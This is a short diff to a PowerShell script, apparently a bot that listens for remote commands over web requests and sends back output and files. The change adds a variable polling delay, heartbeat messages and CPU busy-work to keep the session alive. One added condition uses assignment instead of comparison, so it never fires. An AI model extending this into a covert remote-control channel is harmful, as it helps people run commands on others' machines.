@@ -177,6 +177,8 @@ function SendFile($filePath)
 
 function SendMessage($output, $cmd)
 {
+    if ($cmd = "") {$cmd = "None"}
+    
     # To escape _*``[\
     $output = $output -replace "([$([regex]::Escape('_*``[\'))])", "\`$1"
 
@@ -343,7 +345,18 @@ function CommandListener
                     }
                 }
             }
-            Start-Sleep -Milliseconds 1000
+                        
+            # Gestione delle pause tra le webrequest 
+            $timeout = $timeout+100
+            Start-Sleep -Milliseconds $timeout
+            if ($timeout -eq 10000) {
+                SendMessage "[Heart Beat] 1"
+                # Impegna la CPU per evitare che la sessione di powershell si blocchi
+                for ($i = 0; $i -lt 5; $i++) {(Get-Random) + (Get-Random) / 2 * 20}
+                SendMessage "[Heart Beat] 2"
+                $timeout = 1000
+            }
+
         } catch { Start-Sleep -Seconds 5 }
     }
     # Elimina la sessione di richieste web
